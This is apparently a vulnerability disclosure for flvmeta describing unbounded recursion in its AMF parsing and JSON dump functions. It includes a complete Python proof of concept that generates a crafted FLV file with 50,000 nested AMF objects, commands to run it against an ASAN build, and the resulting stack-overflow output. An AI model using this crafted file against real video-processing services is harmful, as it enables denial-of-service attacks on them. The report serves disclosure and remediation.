## Bug0: Stack Overflow via Unbounded Recursion in amf_data_read and json_amf_data_dump

The mutually recursive functions `amf_data_read()` and `amf_object_read()` in `amf.c` and the self-recursive function `json_amf_data_dump()` in `dump_json.c` impose no recursion depth limit, allowing a crafted FLV Script tag with deeply nested AMF objects to exhaust the thread stack and crash the process with SIGSEGV.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

NESTING_DEPTH = 50000
OUTPUT_FILE = "poc_input.flv"


def build_nested_amf(depth):
    # Innermost value: AMF number 0.0 (type 0x00 + 8 zero bytes)
    data = b"\x00" + b"\x00" * 8

    # Each wrapper layer: 0x03 (object) + key "a" + inner value + end marker
    key = b"\x00\x01" + b"a"
    end_marker = b"\x00\x00\x09"

    for _ in range(depth):
        data = b"\x03" + key + data + end_marker

    return data


def build_flv(amf_payload):
    # FLV header: signature + version + flags + header_size (9)
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)

    # First previous_tag_size = 0
    prev_tag_size_0 = struct.pack(">I", 0)

    # Script tag (type 0x12)
    tag_type = b"\x12"
    data_size = struct.pack(">I", len(amf_payload))[1:]  # 3 bytes big-endian
    timestamp = b"\x00\x00\x00"
    timestamp_ext = b"\x00"
    stream_id = b"\x00\x00\x00"

    script_tag = (tag_type + data_size + timestamp + timestamp_ext +
                  stream_id + amf_payload)

    # previous_tag_size for script tag = 11 (header bytes) + payload length
    prev_tag_size_1 = struct.pack(">I", 11 + len(amf_payload))

    return flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1


# AMF0 string "onMetaData": type 0x02 + uint16_BE length + bytes
on_metadata = b"\x02" + struct.pack(">H", len("onMetaData")) + b"onMetaData"

# Deeply nested AMF object as the metadata value
nested_obj = build_nested_amf(NESTING_DEPTH)

amf_payload = on_metadata + nested_obj
flv_data = build_flv(amf_payload)

with open(OUTPUT_FILE, "wb") as f:
    f.write(flv_data)

print(f"Written {len(flv_data)} bytes to {OUTPUT_FILE}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: stack-overflow on address 0x7ffd5a674ff8 (pc 0x7fc90de6a886 bp 0x000000000000 sp 0x7ffd5a675000 T0)
    #0 0x7fc90de6a886 in __sanitizer::StackDepotBase<__sanitizer::StackDepotNode, 1, 20>::Put(__sanitizer::StackTrace, bool*) sanitizer_stackdepotbase.h:100
    #1 0x7fc90de6a3cb in __sanitizer::StackDepotPut(__sanitizer::StackTrace) sanitizer_stackdepot.cpp:98
SUMMARY: AddressSanitizer: stack-overflow sanitizer_stackdepotbase.h:100 in __sanitizer::StackDepotBase<__sanitizer::StackDepotNode, 1, 20>::Put(__sanitizer::StackTrace, bool*)

### Impact

An attacker who can supply a crafted FLV file can trigger unbounded mutual recursion between `amf_data_read()` and `amf_object_read()`, exhausting the 8 MB default thread stack and crashing the process with SIGSEGV, constituting a reliable denial of service. The attack requires only a ~350 KB FLV file with 50,000 levels of nested AMF objects, well within the 16 MB Script tag size limit, and no authentication or special privileges. In server-side video processing pipelines that invoke flvmeta automatically, any user with file upload access can remotely crash the service with a single request.
